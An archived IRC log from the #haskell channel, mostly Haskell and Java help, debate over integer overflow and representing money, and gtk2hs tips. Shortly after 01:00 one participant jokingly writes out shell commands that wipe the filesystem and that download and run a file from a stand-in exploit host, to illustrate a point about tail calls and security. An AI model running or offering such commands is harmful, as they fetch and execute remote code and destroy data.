00:00:14 <oerjan> but i have a hunch you actually don't want those returns there, so i didn't change it
00:01:26 <oerjan> or maybe you do.  hm.
00:02:29 <hpaste>  oerjan annotated "(no title)" with "with more let" at http://hpaste.org/6025#a2
00:05:00 <oerjan> codetoad: are you actually using IO in that function?  if not you can do it without do notation at all
00:05:28 <codetoad> no, i'm not, actually
00:05:41 <codetoad> i had just started writing it that way to get used to it and to print things out
00:05:49 <oerjan> then just make it a pure function
00:06:26 <codetoad> http://en.wikibooks.org/wiki/Haskell/Indentation that helps re: do/if-then-else
00:06:27 <lambdabot> Title: Haskell/Indentation - Wikibooks, collection of open-content textbooks
00:15:52 <hpaste>  (anonymous) annotated "(no title)" with "(no title)" at http://hpaste.org/6025#a3
00:16:28 <codetoad> i tried adding a second 'where' under runElection ballots' but saw a syntax error.
00:16:36 <codetoad> instead of the let above
00:16:45 <adu> codetoad: nice golden rule
00:17:17 <wy> hello~
00:17:24 <oerjan> only one where per declaration
00:17:26 <wy> Is there something like a pair in Java?
00:17:42 <adu> wy: you mean like (a,b)?
00:17:42 <wagle_home> whats a pair in java?
00:18:06 <wy> Yeah. Maybe it's better to write my own?
00:18:29 <wy> wagle_home: Just to hold two things... I found much trouble without it
00:18:36 <wagle_home> oh.. you want it in java
00:18:56 <adu> http://www.gnu.org/software/kawa/api/gnu/lists/Pair.html
00:18:57 <lambdabot> Title: Pair
00:19:29 <wagle_home> first thing that occurs to me is a length 2 array
00:19:36 <hpaste>  oerjan annotated "(no title)" with "with guards" at http://hpaste.org/6025#a4
00:19:58 <oerjan> codetoad: ^^
00:20:00 <wy> alright. It seems to be better to roll my own
00:20:36 <adu> wagle: perhaps wy needs assurance that a pair will be of type a -> [a] -> [a]
00:24:39 <wy> It's a pleasure to reinvent the wheel ;)
00:27:57 <wagle_home> class Pair { Object fst, snd ; Pair (fst, snd) { this.fst = fst; this.snd=snd; }  ... }
00:29:46 <oerjan> final Object perhaps?
00:34:35 <wy> I looked at the API, the LinkedList doesn't even have tail(). Obviously... for a  language without proper tail recursion
00:35:43 <lamentb> tail recursion won't help much if it's an infinite list :)
00:38:20 <wy> uhh. You got me
00:39:01 <wy> I tried to write abstract class MyList<T> {...} but I found that I can't define null without a type parameter...
00:42:10 <wagle_home> :t []
00:42:11 <lambdabot> forall a. [a]
00:43:06 <wagle_home> i thought java did have tail recursion
00:44:08 <wy> no, I tried. stack overflow
00:44:19 <wy> just write a sum with recursion
00:44:53 <wagle_home> exceptions accumulating?
00:45:01 <wagle_home> exception handlers accumulating?
00:45:39 <jsh_> (/ x -> (\ y -> x))
00:46:04 <jsh_> :t (/ x -> (\ y -> x))
00:46:06 <lambdabot> parse error on input `->'
00:46:55 <dolio> I think they don't like TCO because the security model relies on information in the stack.
00:47:45 <jsh_> quit
00:48:11 <dolio> And ruins exception stack traces if you're into that.
00:48:38 <jsh_> :t (\ x -> x)
00:48:40 <lambdabot> forall t. t -> t
00:49:28 <jsh_> :t (\ x -> [x])
00:49:29 <lambdabot> forall t. t -> [t]
00:50:03 <dolio> Although I've heard cases for self-tail call optimization.
00:50:11 <jsh_> :t (\ x -> [x])::Bool->[Bool]
00:50:12 <lambdabot> Bool -> [Bool]
00:51:23 <jsh_> (\ x -> [x]) False
00:52:02 <oerjan>  >
01:02:03 <dolio> For instance, MaliciousClass's method makes a tail call to system("rm -rf /"), but all you can see on the stack is method calls from TrustedClass.
01:06:29 <Mr_Awesome> dolio: luckily, MaliciousClass doesn't have root privileges
01:07:35 <dolio> Yeah, well, make it system("wget http://root-explit.com/exploit ; ./exploit ; rm -rf /") :)
01:07:35 <lambdabot> Title: Com.org - Only the best links ...
01:08:58 <hpaste>  morrow pasted "shell script is cool" at http://hpaste.org/6026
01:10:40 <hpaste>  morrow annotated "shell script is cool" with "(no title)" at http://hpaste.org/6026#a1
01:16:14 <wy> I found I can only ask java questions in #haskell ;)
01:17:21 <wagle_home> "clinical detachment"
01:17:40 <wy> Is there any way to define a method in an interface, say it depends on another method
01:18:04 <wy> it only has fewer parameters, which I want them to be default
01:18:19 <wy> wagle_home: :)
01:19:18 <wy> much like type classes...
01:19:25 <wagle_home> last time i really read the java language definition cover-to-cover was 1995..  8)
01:19:43 <wy> wagle_home: oh, awesome
01:19:46 <ac> morner: I hope you're being sarcastic
01:20:02 <ac> er, morrow
01:20:05 <wy> I found #java especially hostile
01:20:58 <wagle_home> wy, what happened there?
01:21:20 <wy> wagle_home: Whenever I ask something, people just say "read the API"
01:22:05 <xerox> ?remember Wild_Cat [on #python] <Wild_Cat> (I mean, if you believe the #haskell denizens, half the financial world uses Haskell)
01:22:05 <lambdabot> Good to know.
01:22:12 <wy> I guess my question would be considered stupid again
01:22:36 <wy> xerox: really?
01:23:06 <wagle_home> i have the vague impression that interface allow concrete methods now, but dont really know
01:24:20 <wagle_home> the java language definition is easy to get in pdf
01:24:33 <therp> xerox: where does the idea come from that half of the financial world uses haskell?
01:24:38 <wy> wagle_home: Is it true that concrete methods in type classes are different from normal functions?
01:24:54 <hpaste>  morrow annotated "shell script is cool" with "hmm" at http://hpaste.org/6026#a2
01:26:02 <dolio> Method definitions in type classes are just defaults. They can be overridden per-instance.
01:26:23 <xerox> therp: the banks' affairs with haskell must have impressed him.
01:26:40 <wy> dolio: Does that mean they normally depends on other methods in the same class?
01:26:53 <dolio> Yeah.
01:27:24 <Heffalump> I suspect that half of the big banks are using Haskell in some way.
01:27:27 <dolio> Sometimes you can give default implementations, but certain instances might have more efficient ways of implementing them.
01:27:43 <sioraiocht> Heffalump: I think it would be safer to say "using functional programming" than "using Haskell"
01:27:51 <XD-G-C> dons considered harmful
01:28:23 <dolio> Or, maybe functions can be implemented in terms of one another, and it's easier for one instance to define one such function, while another is easier with another function.
01:28:47 <wy> dolio: that sounds very reasonable
01:28:57 <Heffalump> sioraiocht: well, I still think half or close to half of major banks are using Haskell in some way.
01:29:19 <Heffalump> If you add in functional programming then probably most are using it.
01:29:51 <wy> I thought they were using Cobol ...
01:30:16 <wagle_home> ewww...  how do they protect themselves from Int?
01:30:32 <Heffalump> wagle_home: who?
01:31:01 <wagle_home> the banks
01:31:07 <Heffalump> why would they need to?
01:31:15 <wagle_home> it wraps around
01:31:24 <Heffalump> that's true in most languages
01:31:38 <wagle_home> not all
01:31:58 <Heffalump> most commonly used languages
01:32:12 <wagle_home> not scheme, for example
01:32:37 <Heffalump> this doesn't seem particularly relevant
01:32:57 <dolio> What happens in scheme? Error?
01:33:39 <ac> Shell script is awesome... like getting addicted to meth is.
01:33:40 <sioraiocht> wagle_home: umm, i'm pretty sure integer overflow is a fact of life in computing.
01:33:47 <wagle_home> just that lots of exploits use integer wraparound, but the static type people hold their ears while shouting LALALALA when presented with the concept of int32 wraparound
01:33:53 <ac> C++ is awesome... like getting boned in the ass is
01:34:01 <ac> Haskell is awesome... like getting brain surgery is
01:34:07 <sioraiocht> wagle_home: also, from what i understand this sort of programming is used in risk/reward assessments, not actually banking/transaction software
01:34:25 <wli> ac: Some people may actually like that.
01:34:38 <ac> wli: some people may actually like C++
01:34:44 <dolio> Getting brain surgery?
01:34:47 <Heffalump> wagle_home: exploits of what? Security isn't generally a big issue in financial software, it's not exposed in that way.
01:35:23 <ac> dolio: sure, getting brain surgery is awesome... it can save your life
01:35:25 <Heffalump> s/financial software/internal financial software used for valuation etc/
01:36:12 <wagle_home> > maxBound::Int
01:36:13 <lambdabot>  2147483647
01:36:38 <wagle_home> 2.1 billion dollars, then you wrap
01:36:55 <dolio> > maxBound :: Integer
01:36:55 <lambdabot>   add an instance declaration for (Bounded Integer)
01:36:55 <lambdabot>     In the expression: ma...
01:37:03 <wagle_home> more often if you are counting pennies
01:37:12 <Heffalump> umm, you don't represent values in a 32-bit integer.
01:37:30 <Heffalump> you use double.
01:37:30 <sioraiocht> > maxBound :: Int32
01:37:31 <lambdabot>  2147483647
01:37:34 <wagle_home> QUOTE ewww...  how do they protect themselves from Int?
01:37:40 <sioraiocht> > maxBound :: Int64
01:37:40 <lambdabot>  9223372036854775807
01:37:48 <sioraiocht> i'm pretty sure that would do juuuuuuust fine
01:38:05 <Heffalump> you seem completely obsessed with something that, as sioraiocht says, is just a fact of life that people are completely used to
01:38:30 * wagle_home watches Heffalump shouts LALALALA
01:38:37 <ac> is writing financial software in Haskell the topic of discussion?
01:38:46 <Heffalump> ac: I think so.
01:39:14 <Heffalump> all I was saying was that a lot of banks use it in some capacity, albeit generally pretty small
01:39:43 <XD-G-C> the problem is that dons has been brainwashing the internet about this haskell stuff
01:39:50 * wli instinctively avoids the machine integers but doesn't really have much to say about it.
01:40:06 <ac> What's a good way to represent money? A datatype that holds an integer and semantics to indicate the decimal place is fixed at say, 4 places?
01:40:32 <sioraiocht> ac: no, a lot use a BigNum library for actual production software
01:40:34 <Heffalump> ac: no, double.
01:40:42 <XD-G-C> double?
01:40:52 <sioraiocht> > maxBound :: Double
01:40:53 <lambdabot>   add an instance declaration for (Bounded Double)
01:40:53 <lambdabot>     In the expression: max...
01:40:57 <sioraiocht> oh bummer
01:40:58 <Heffalump> it depends what you want to do. If you are keeping a permanent record of real transactions, a fixed point representation is best.
01:41:07 <wagle_home> people have exploited double roundoff to make lots of money
01:41:11 <Heffalump> If you want to value something complicated, just use double.
01:41:29 <sioraiocht> wagle_home: yeah, you don't use it in real-time banking software
01:41:31 <XD-G-C> i'd probably use complex numbers
01:41:42 <sioraiocht> wagle_home: I doubt Fedwire uses doubles =p
01:41:44 <ac> Heffalump: the only time I dealt with financial stuff I was using PHP (hah!)
01:42:02 <wagle_home> you dont use it in basic accounting software\
01:42:06 <dolio> What do Scheme integers do when they overflow?
01:42:21 <wagle_home> become bignums
01:42:29 <dolio> That's what Integer is for.
01:42:29 <xerox> ?slap XD-G-C
01:42:29 * lambdabot throws some pointy lambdas at XD-G-C
01:42:31 <ac> All transactions stored were values with 4 fixed digits of precision
01:42:36 <XD-G-C> D:
01:42:56 <Heffalump> wagle_home: right, that's what I mean by making a permanent record of real transactions.
01:43:07 <sioraiocht> ac: that makes sense, how much is .0001 of any currency REALLY worth anyway? =p
01:43:13 <Heffalump> But if you're valuing derivatives, you do everything in double and round at the end.
01:43:27 <Heffalump> double roundoff doesn't matter unless you get numerical instability type issues
01:43:40 <sioraiocht> wagle_home: valuation software would not run in realistic time/memory constraints if you used bignum
01:43:45 <wagle_home> sioraiocht, think lots and lots and lots of transactions..  this is the computer age, it happens
01:43:56 <sioraiocht> okay
01:44:25 <sioraiocht> let's say 1,000,000 transactions cost the bank .0001 each
01:44:39 <sioraiocht> 1) what probability do they gain money by the same occurrence
01:44:40 <wagle_home> the fractions of a penny can accumulate into serious money
01:44:52 <XD-G-C> haven't you seen office space
01:44:54 <XD-G-C> ....
01:44:57 <sioraiocht> and 2) that's a whopping 100 dollars
01:45:47 <dolio> That's why you misplace the decimal point and make hundreds of thousands in a couple days.
01:46:12 <hpaste>  morrow annotated "shell script is cool" with "relationship to tail recursion?" at http://hpaste.org/6026#a3
01:46:27 <ac> reminds me of a recording of a phone conversation I ran accross online about this guy trying to explain to 5 different customer service people that 1/100th of a cent is different than 1/100th of a dolar :-P
01:46:39 <Heffalump> :-)
01:46:44 * wli mutters something about arbitrary precision fixed point BCD numbers.
01:48:05 <Heffalump> machine efficiency matters a lot :-)
01:48:13 <lightstep> or decimal computers
01:48:37 <wli> The machine efficiency of a program that fails is zero.
01:48:59 <opqdonut> wli: one could also use hensel codes
01:48:59 <hpaste>  morrow annotated "shell script is cool" with "(no title)" at http://hpaste.org/6026#a4
01:49:07 <Heffalump> yes, but you architect programs so they don't fail
01:49:29 <wagle_home> small bignums aren't that big a burden
01:50:10 <Heffalump> too big for many things that are already close to the limit, though
01:50:31 <Heffalump> the problem is that if your starting point is a C++ program that people are using to push available computing capacity to the limit, then you can't make it any slower
01:50:33 <lightstep> in gtk2hs, how can i get a GC for my DrawWindow?
01:50:43 <hpaste>  mmorrow annotated "shell script is cool" with "(no title)" at http://hpaste.org/6026#a5
01:52:33 <wagle_home> uh huh..  an array of mostly 1, but occasionally 2 elements is going to destroy efficiency at the cost of preserving correctness
01:53:24 <Heffalump> it's not at the cost of preserving correctness
01:53:24 <hpaste>  morrow annotated "shell script is cool" with "(no title)" at http://hpaste.org/6026#a8
01:53:41 <wagle_home> ? maxBound + 1 : Int
01:53:48 <wagle_home> > maxBound + 1 : Int
01:53:48 <lambdabot>   Not in scope: data constructor `Int'
01:53:55 <wagle_home> > maxBound + 1 :: Int
01:53:56 <lambdabot>  -2147483648
01:54:12 <Heffalump> hey, guess what, programs produce the wrong result when you write wrong code
01:54:14 <wagle_home> dollars dont act that way
01:54:27 <Heffalump> I've already told you that people don't use Int for dollars.
01:54:52 <Heffalump> at least, noone I know of.
01:55:04 <wagle_home> whens the last time you wrote a haskell program with every last bit explicitly typed?
01:55:15 <hpaste>  mmorrow annotated "shell script is cool" with "annouce checkbox option noted" at http://hpaste.org/6026#a9
01:55:23 <Heffalump> "every last bit"?
01:55:32 <lightstep> wagle_home, why would you do that?
01:55:38 <Heffalump> I usually put signatures on top-level things.
01:56:02 <wagle_home> lightstep, to keep haskell from deciding to use Int
01:56:03 <ac> What's Haskell's type for arbitrary precision reals?
01:56:11 <Heffalump> I don't think it has one
01:56:39 <wagle_home> several prelude functions use Int
01:57:09 <Heffalump> if you're representing a financial value, typically it'd be in a datastructure anyway, and you'd declare it to be Double or whatever.
01:57:21 <lightstep> wagle_home, haskell decides which type to use only for temporary, in-line computations. whenever you put the value into a data structure or use a (/) operator, Fractional is forced
01:57:25 <wagle_home> appletalk barfed at Indiana University because there were more than 2^32 users
01:57:28 <lightstep> (or, more likely, Double)
01:57:28 <Heffalump> which by the magic of type inference would cause intermediate calculations with it to use Double too
01:58:12 <wagle_home> Double has roundoff errors
01:58:29 <XD-G-C> i can't believe you're still arguing about this
01:58:30 <Heffalump> and they don't matter, if you're careful
01:58:37 * sioraiocht wonders why wagle_home is bringing up issues that have seriously been there since the BEGINNING OF COMPUTING.
01:58:56 <Baughn> When using cabal-install, I pretty much have to invoke it once per package I want to install - if there are dependencies, only the first installs and the others fail. Is this a known bug, or my fault?
01:58:56 <sioraiocht> it's not lke this is some weird programming langauge quirk
01:59:11 <wagle_home> because you dont understand the solutions
01:59:43 * lightstep would like to direct the discussion to his gtk problem
01:59:50 <wagle_home> haskell has embraced Int
02:00:14 <lightstep> in gtk+, i can to widget->style, and the the current GC
02:00:18 * Heffalump doesn't know anything about gtk, but it seems more interesting than continuing a pointless argument with wagle_home.
02:00:22 <opqdonut> somebody wise has said that misunderstanding floating point is the biggest problem of a programmer
02:00:24 <wagle_home> ... and lets you use it as if it were Integer
02:00:31 <opqdonut> or treating it as not needing understanding
02:00:48 <wagle_home> Heffalump is not someone i would let write a program for me
02:00:59 <sioraiocht> LOL
02:01:06 <Heffalump> that's ok, I'll keep writing them for the bank that pays me to do it :-p
02:01:12 <sioraiocht> Heffalump: I guess you better start crying, now =p
02:01:19 <lightstep> didn't Heffalump win the icfp or something?
02:01:39 <wagle_home> good..  i hope you get held liable for the exploits you build into the software
02:02:11 <Heffalump> wagle_home: you are, quite frankly, full of crap.
02:02:26 <wagle_home> lance armstrong won the tour de france several times..  i'll hire him as a programmer
02:02:44 <dolio> The only Int based functions I see in the prelude have to do with the length of lists.
02:02:53 <dolio> And those all have generic versions in Data.List.
02:02:54 * oerjan hears augustss won the IOCCC several times
02:03:02 <Heffalump> twice, I think
02:03:29 <dolio> Oh, and to/fromEnum.
02:03:30 <oerjan> now he is not even allowed to get _near_ a bank
02:03:32 <wagle_home> Heffalump, your ego far outstrips your intelliegnce
02:03:34 <Baughn> Using Int for list functions would make sense, except for the laziness. Still, I'Ll use the generic ones if I need to.
02:04:29 <lightstep> ?info Enum
02:04:29 <lambdabot> Enum
02:04:29 <Heffalump> Baughn: it's a bit of a shame that the "make it easy to teach" brigade won out over the "use sensible overloading" people.
02:04:41 <oerjan> @src Enum
02:04:41 <lambdabot> class  Enum a   where
02:04:41 <lambdabot>     succ                     :: a -> a
02:04:41 <lambdabot>     pred                     :: a -> a
02:04:41 <lambdabot>     toEnum                   :: Int -> a
02:04:41 <lambdabot>     fromEnum                 :: a -> Int
02:04:43 <lambdabot> [3 @more lines]
02:04:46 <Heffalump> But using Int for list length is rarely an issue, as you say.
02:05:20 <lightstep> > fromEnum (10**50::Integer)
02:05:20 <lambdabot>   add an instance declaration for (Floating Integer)
02:05:29 <lightstep> > fromEnum (10^50::Integer)
02:05:30 <lambdabot>  0
02:06:07 <Baughn> Heffalump: It could be an issue when the list is actually a stream. Still, how often do you deal with chunks of more than four billion elements at once?
02:06:25 <Baughn> ..also, I'm on a 64-bit system. :P
02:06:38 <opqdonut> :)
02:06:48 <opqdonut> "well i'm on a 8-bit system"
02:06:58 <wagle_home> will Int be Int64 on such a system?
02:07:01 <Baughn> Sorry, this isn't ##c. :/
02:07:05 <Baughn> wagle_home: Yep
02:07:10 <Heffalump> Baughn: right.
02:07:35 <Heffalump> Baughn: it'd also take a very long time to run, if your list really was that long.
02:07:57 <wagle_home> neato:
02:08:00 <wagle_home> Prelude> maxBound :: Int
02:08:00 <wagle_home> 9223372036854775807
02:08:12 <Heffalump> in GHC, Int is machine int.
02:08:17 <ac> lol @ wagle_home
02:08:18 <Heffalump> the standard only requires 29 bits, though.
02:08:30 <Baughn> Heffalump: The file-system driver I'm working on is currently on network message #slightly-over-seven-billion. It's using stream io, so..
02:08:52 <Heffalump> fair enough
02:08:58 <Baughn> Heffalump: Even so, I *don't* pass any large numbers to any list functions. Mostly I use head.
02:09:14 <Heffalump> if your application really was architected in terms of keeping the entire stream of messages in a list you took the length of, then it'd be an issue :-)
02:09:21 <Heffalump> but somehow I doubt that this would actually be any use
02:09:34 <Heffalump> I suppose you might take the length of smaller chunks then add them up.
02:09:51 <Heffalump> which is more typically the problem with length x :: Int - that you then want to combine it with some other number.
02:10:15 <ac> then you can always une fromIntegral
02:10:23 <Heffalump> ac: sure. It's just a pain.
02:10:34 <Baughn> The programmer is supposed to deal with this. It's no different from using floating-point wrongly.
02:10:39 <Heffalump> especially since I have trouble remembering the name of that :-)
02:10:41 <Heffalump> Baughn: right.
02:10:51 <dcoutts> lightstep: you probably don't want to be using the old Gdk/GC drawing functions, use cairo, but if you must then there is a way to make a new GC
02:11:00 <oerjan> @quote fromIntegral
02:11:00 <lambdabot> monochrom says: You've got an Int / But you want Double / Who do you call? / "fromIntegral!"
02:11:17 <oerjan> Heffalump: note it rhymes.  well, almost.
02:11:33 <lightstep> dcoutts, i have a small shaped window, and i'm afraid cairo would be too smeared
02:12:03 <lightstep> (maybe i should try it out before saying so)
02:12:19 <dcoutts> lightstep: see http://haskell.org/~duncan/gtk2hs/ants/
02:12:45 <dcoutts> lightstep: that's a simulator for ICFP'04 that's ultra-fast and uses Gdk drawing with GCs
02:12:55 <lightstep> thanks
02:13:10 <ac> Heffalump: yeah, I found myself using generic list functions for that reason, and someone pointed out to me that that's actually a lot slower, and I should just use fromIntegral
02:13:36 <ac> and that there's very little practical use for generic list functions
02:14:12 <Heffalump> but you're sacrificing correctness! :-)
02:14:39 <ac> lightstep: what're you making?
02:14:39 <oerjan> > cycle "Am not!  Are too!  "
02:14:40 <lambdabot>  "Am not!  Are too!  Am not!  Are too!  Am not!  Are too!  Am not!  Are too! ...
02:15:14 <dcoutts> lightstep: that visualiser preallocates a number of GCs so that it doesn't have to waste time changing the GC properties, it just creates the few it needs with different properties and then uses them for the rest of the time
02:15:24 <lightstep> ac, a cat that follows the cursor around the screen
02:15:48 <Heffalump> what is a GC?
02:15:52 <dcoutts> lightstep: which makes the animation very fast even over remote X sessions with high latency
02:15:58 <lightstep> yeah, i saw it. i didn't know you could pre-allocate GCs, and i didn't notice newGCWithValues before
02:16:01 <Heffalump> (having finally figured out that it's not a garbage collection)
02:16:09 <lightstep> graphics context
02:16:10 <dcoutts> Heffalump: a graphics context, it's a Gdk wrapper of an X concept
02:16:50 <dcoutts> Heffalump: instead of sending all the properties of every graphics operation, you have one or more contexts that hold the less often changing parameters
02:16:58 <wagle_home> you seen the x program that has cochroaches scurying around the screen, hiding under the windows..  much better than the cat
02:17:07 <dcoutts> Heffalump: so they don't have to be sent again and again over the X connection
02:17:14 <ac> lightstep: cute :)
02:17:25 <Heffalump> fair enough
02:17:53 <lightstep> wagle_home, no, do you have a reference?
02:17:56 <ac> Heffalump: like foreground and background color, line width, etc
02:18:03 <wagle_home> looking
02:19:09 <ac> lightstep: I was just fooling with gtk the other day. I figured out how to run mainGUI in another thread and pass a Pixbuf that's displayed, so I can draw things interactively in ghci.
02:20:06 <wagle_home> @go xroach
02:20:08 <lambdabot> http://linux.maruhn.com/sec/xroach.html
02:20:08 <lambdabot> Title: Xroach - Displays disgusting cockroaches on your root X window
02:20:25 <wagle_home> lightstep, 8)  ^^^^
02:22:40 <ac> did anybody see the reddit post on the site that was taken down thanks to the leap year?
02:23:00 <ac> that line of code made me laugh. Also made me laugh that they had debugging on production
02:26:56 <Heffalump> we once accidentally put a debug build out into production. Unfortunately the debug build checked a registry key for some instrumentation purpose, and as a result behaved badly in production for some reason (I think no perms to access it)
02:29:42 <TSC> @src sequence
02:29:42 <lambdabot> sequence []     = return []
02:29:42 <lambdabot> sequence (x:xs) = do v <- x; vs <- sequence xs; return (v:vs)
02:29:42 <lambdabot> --OR
02:29:42 <lambdabot> sequence xs = foldr (liftM2 (:)) (return []) xs
02:30:07 <dolio> Huh. That's been tweaked.
02:38:49 <Baughn> @ty liftM2
02:38:50 <lambdabot> forall a1 a2 r (m :: * -> *). (Monad m) => (a1 -> a2 -> r) -> m a1 -> m a2 -> m r
02:39:13 <Baughn> Isn't the kind declaration for m redundant?
02:39:34 <opqdonut> yes
02:39:41 <opqdonut> but lambdabot likes to be explicit
02:42:00 <Baughn> > liftM2 (+) [1] [2]
02:42:01 <lambdabot>  [3]
02:42:59 <Baughn> > liftM2 (+) [1..3] [2..4]
02:43:00 <lambdabot>  [3,4,5,4,5,6,5,6,7]
02:46:51 <wagle_home> > liftM2 (+) [1..3] [2..]
02:46:51 <lambdabot>  [3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,3...
02:47:03 <wagle_home> > liftM2 (+) [1..] [2..4]
02:47:03 <opqdonut> :)
02:47:04 <lambdabot>  [3,4,5,4,5,6,5,6,7,6,7,8,7,8,9,8,9,10,9,10,11,10,11,12,11,12,13,12,13,14,13,...
02:47:13 <wagle_home> > liftM2 (+) [1..] [2..]
02:47:13 <lambdabot>  [3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,3...
02:47:21 <wagle_home> cool
02:47:32 <Baughn> @src [] (>>=)
02:47:32 <lambdabot> m >>= k     = foldr ((++) . k) [] m
02:48:43 <Baughn> @src liftM2
02:48:43 <lambdabot> liftM2 f m1 m2 = do { x1 <- m1; x2 <- m2; return (f x1 x2) }
02:49:02 <Baughn> @. undo src liftM2
02:49:03 <lambdabot> ()
02:49:13 <opqdonut> wow
02:49:22 <Baughn> ..that doesn't seem quite right
02:49:26 <opqdonut> no :)
02:49:34 <opqdonut> @undo do { x1 <- m1; x2 <- m2; return (f x1 x2) }
02:49:35 <lambdabot> m1 >>= \ x1 -> m2 >>= \ x2 -> return (f x1 x2)
02:50:47 <Baughn> > (1+) =<< [1..4]
02:50:47 <lambdabot>   add an instance declaration for (Enum [b], Num [b])
02:51:01 <wagle_home> though i wonder if a list bind that diagonalized would work
02:51:10 <Baughn> > map (1+) =<< [1..4]
02:51:10 <lambdabot>   add an instance declaration for (Enum [t], Num [t])
02:51:24 <Baughn> > liftM (1+) =<< [1..4]
02:51:24 <lambdabot>   add an instance declaration for (Enum [t], Num [t])
02:51:33 * Baughn grumbles
02:51:51 <Baughn> wagle_home: Sure it would, but it wouldn't be the same monad
02:52:04 <Beelsebob> @do m1 >>= \ x1 -> m2 >>= \ x2 -> return (f x1 x2)
02:52:04 <lambdabot> m1 >>= \ x1 -> m2 >>= \ x2 -> return (f x1 x2) not available
02:52:08 <Baughn> > (liftM (1+)) =<< [1..4]
02:52:09 <Beelsebob> aww
02:52:09 <lambdabot>   add an instance declaration for (Enum [t], Num [t])
02:52:11 <Beelsebob> disapointing
02:52:34 <Baughn> > do a <- [1..4]; return (1+ a)
02:52:35 <lambdabot>  [2,3,4,5]
02:52:39 <Baughn> @und  do a <- [1..4]; return (1+ a)
02:52:39 <lambdabot> Maybe you meant: undefine undo
02:52:42 <Baughn> @undo  do a <- [1..4]; return (1+ a)
02:52:43 <lambdabot> [1 .. 4] >>= \ a -> return (1 + a)
02:53:08 <Beelsebob> see Baughn map (+1) [1..4] just looks so much nicer
02:53:13 <Baughn> > [1..4] >>= [] . (1+)
02:53:14 <lambdabot>  Couldn't match expected type `a -> [b]'
02:53:20 <Beelsebob> I hate pountless uses of monads like that
02:53:23 <Beelsebob> pointless*
02:53:30 <Baughn> Beelsebob: It's for the purpose of learning
02:53:39 <Beelsebob> fair enough
02:53:39 <cin> > fmap (+1) [1..4]
02:53:40 <lambdabot>  [2,3,4,5]
02:53:47 <Baughn> Beelsebob: If I didn't get errors three out of every four tries, I wouldn't do it. :P
02:53:55 <Beelsebob> hehe
02:53:56 <Beelsebob> :)
02:54:06 <Baughn> @src [] return
02:54:06 <lambdabot> return x    = [x]
02:54:18 <Baughn> > [1..4] >>= ([] . (1+))
02:54:19 <lambdabot>  Couldn't match expected type `a -> [b]'
02:54:33 <Baughn> @ty \a -> (return (1+a))
02:54:35 <lambdabot> forall t (m :: * -> *). (Monad m, Num t) => t -> m t
02:55:00 <Baughn> ..oh.
02:55:08 <desegnis> > return . (1+) =<< [1..4]
02:55:08 <lambdabot>  [2,3,4,5]
02:55:32 <desegnis> > (:[]) . (1+) =<< [1..4]
02:55:32 <lambdabot>  [2,3,4,5]
02:55:50 <desegnis> Baugn, the expression [] denotes the empty list
02:56:20 <Baughn> ..I knew that. ^_^;
02:56:54 <desegnis> I mean, in constrast to (:[]), which constructs a list
02:57:07 <Baughn> Right, which was what I was actually trying for.
03:18:50 <DRMacIver> Hm
03:18:57 <DRMacIver> bnfc appears to be, to a very close approximation, magic. :)
03:21:47 <olsner> what does the 'c' stand for?
03:22:49 <olsner> DRMacIver: http://www.cs.chalmers.se/Cs/Research/Language-technology/BNFC/doc/tutorial/bnfc-tutorial.html this thing?
03:22:51 <lambdabot> Title: BNF Converter Tutorial, http://tinyurl.com/3a6kgg
03:24:24 <DRMacIver> olsner: Yes
03:25:15 <mikael> DRMacIver: here's what I use to color it in emacs, if that's your thing: http://localhost:82/~mbrock/bnfc-mode.el
03:25:25 * DRMacIver has been meaning to write a toy language for ages, and has been meaning to get back to writing more Haskell (I doubt I've written 200 lines of it in the last 6 months. :-/ )
03:25:30 <DRMacIver> So the obviou ssolution presented itself. :)
03:25:34 <DRMacIver> mikael: Thanks
03:25:44 <DRMacIver> mikael: But pointing me towards your localhost isn't so useful. ;)
03:25:54 <mikael> sorry :)
03:25:56 <olsner> heh, "Complete grammar for C--" <-- 20 lines of bnfc
03:26:03 <mikael> http://igloo.olf.sgsnet.se:82/~mbrock/bnfc-mode.el
03:26:22 <Mr_Awesome> what is the fastest way to take the nth repeated composition of a function? as in, compose the function n times and compute the result
03:26:35 <DRMacIver> Wait, sorry, I totally misparsed what you were offering me. :)
03:26:42 <DRMacIver> I don't use emacs I'm afraid.
03:26:45 <DRMacIver> But thanks anyway
03:27:19 <olsner> @type \n -> foldl (.) id . replicate n
03:27:20 <lambdabot> forall a. Int -> (a -> a) -> a -> a
03:27:28 <desegnis> > iterate ('A':) "H!" !! 5
03:27:29 <lambdabot>  "AAAAAH!"
03:28:01 <Mr_Awesome> id like constant space, if possible
03:28:42 <olsner> both should be, unless you force the entire infinite lists, in which case it's infinite space :P
03:30:06 <Mr_Awesome> hmm, i ran out of stack space when i used iterate
03:32:25 <olsner> how many function compositions are we talking about btw?
03:34:59 <desegnis> Mr_Awesome, minimal example? maybe something is too lazy in your code or something
03:36:19 <roconnor> or maybe something isn't lazy enough.
03:41:20 <araujo> morning
03:44:13 <Mr_Awesome> desegnis: iterate (+ 0) 0 !! 10000000 -- gives Exception: stack overflow
03:46:26 <Mr_Awesome> > iterate (+ 0) 0 !! 10000000
03:46:29 <lambdabot>  Exception: stack overflow
03:46:50 <Baughn> Mr_Awesome: Because you don't use any of the earlier values, you're just stacking up thunks. It won't happen if you use them.
03:47:08 <Baughn> Mr_Awesome: If you really don't want to, either use strict addition or.. a smarter algorithm, such as "0". :P
03:47:40 <olsner> > (foldl (.) id . replicate 10000000 (+ 0)) 0
03:47:41 <lambdabot>  Couldn't match expected type `[a -> a]'
03:47:54 <olsner> > (foldl (.) id $ replicate 10000000 (+ 0)) 0
03:47:58 <lambdabot> Terminated
03:48:25 <Mr_Awesome> > (foldl' (.) id $ replicate 10000000 (+ 0)) 0
03:48:27 <desegnis> Baughn, alas, Integer addition is strict per se
03:48:29 <lambdabot> Terminated
03:48:50 <Baughn> ..so it is.
03:49:21 <Baughn> He's still collecting (+ 0) thunks, though. I'm not sure what else to call them.
03:49:47 <roconnor> > 450/2
03:49:47 <lambdabot>  225.0
03:49:55 <Baughn> > 450 `div` 2
03:49:56 <lambdabot>  225
03:50:03 <roconnor> > 225 *2/3
03:50:04 <lambdabot>  150.0
03:50:11 <olsner> strictifying the foldl (.) merely means that a bigger function is built and forced in every step... you'd need to somehow apply partial application optimization in every step, or you're just building a very very large function before applying it to anything
03:50:14 <Baughn> > 225 * 2:3
03:50:14 <lambdabot>   add an instance declaration for (Num [t])
03:50:23 <Baughn> ..waait, that's not it
